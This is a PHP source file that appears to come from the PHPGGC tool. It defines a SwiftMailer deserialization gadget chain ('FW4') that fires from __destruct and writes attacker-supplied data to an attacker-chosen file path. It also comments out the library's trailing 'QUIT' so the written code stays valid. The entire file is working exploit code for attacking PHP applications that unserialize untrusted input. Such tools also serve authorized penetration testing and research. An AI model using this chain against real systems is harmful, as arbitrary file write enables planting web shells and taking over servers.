<?php

namespace GadgetChain\SwiftMailer;

class FW4 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '4.0.0 <= ?';
    public static $vector = '__destruct';
    public static $author = 'ronenshh';

    public function process_parameters(array $parameters)
    {
        $parameters = parent::process_parameters($parameters);

        # The library appends "QUIT" at the end of the content, so we need to comment it
        $parameters['data'] .= '//';

        return $parameters;
    }

    public function generate(array $parameters)
    {
        $dispatcher = new \Swift_Events_SimpleEventDispatcher();
        $byte_stream = new \Swift_ByteStream_FileByteStream($parameters['remote_path'], $parameters['data']);
        $transport = new \Swift_Transport_SendmailTransport($byte_stream, $dispatcher);

        return $transport;
    }
}